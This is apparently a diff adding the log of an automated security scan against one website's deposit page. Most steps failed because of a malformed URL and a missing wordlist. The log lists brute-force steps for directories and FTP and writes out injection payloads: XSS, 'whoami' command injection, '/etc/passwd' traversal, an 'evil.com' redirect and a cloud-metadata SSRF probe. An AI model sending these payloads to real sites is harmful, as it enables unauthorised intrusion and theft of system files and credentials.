@@ -1,0 +1,48 @@
+Target: https://edificesasainternational.com/deposit ()
+Started at: Mon Jun 16 18:29:17 EAT 2025
+----------------------------------------
+[1] 🔐 TLS Support
+ → ssl2:  → ssl2: ❌ Not supported
+ → ssl3:  → ssl3: ❌ Not supported
+ → tls1:  → tls1: ❌ Not supported
+ → tls1_1:  → tls1_1: ❌ Not supported
+ → tls1_2:  → tls1_2: ❌ Not supported
+ → tls1_3:  → tls1_3: ❌ Not supported
+[2] 🔍 HTTP Headers
+[3] 📂 Directory Bruteforce (dirb)
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+OUTPUT_FILE: dirb.log
+START_TIME: Mon Jun 16 18:29:18 2025
+URL_BASE: https://https://edificesasainternational.com/deposit/
+WORDLIST_FILES: /usr/share/wordlists/dirb/common
+
+-----------------
+
+
+(!) FATAL: Error opening wordlist file: /usr/share/wordlists/dirb/common
+[4] 🔓 FTP Brute-force (Hydra)
+[5] 🧪 JS-based fuzzing (Headless Chrome)
+[6] ✉️ SMTP Spoof Check
+[7] 🛡️ CVE Banner Detection (Nmap)
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 18:29 EAT
+Nmap done: 0 IP addresses (0 hosts up) scanned in 10.94 seconds
+[8] 💉 Payload Injection Tests
+ → https://https://edificesasainternational.com/deposit/?q=<script>alert(1)</script>
+000
+ → https://https://edificesasainternational.com/deposit/?cmd=whoami
+000
+ → https://https://edificesasainternational.com/deposit/?file=../../../../etc/passwd
+000
+ → https://https://edificesasainternational.com/deposit/redirect?url=http://evil.com
+000
+ → https://https://edificesasainternational.com/deposit/?url=http://169.254.169.254/latest/meta-data/
+000
+[9] 🌐 WHOIS and rDNS
+[10] 🎯 Header-based Injection (Shellshock, Log4j, Host Poison)
+[11] 🔎 DNSRecon
+✅ Finished at: Mon Jun 16 18:29:30 EAT 2025
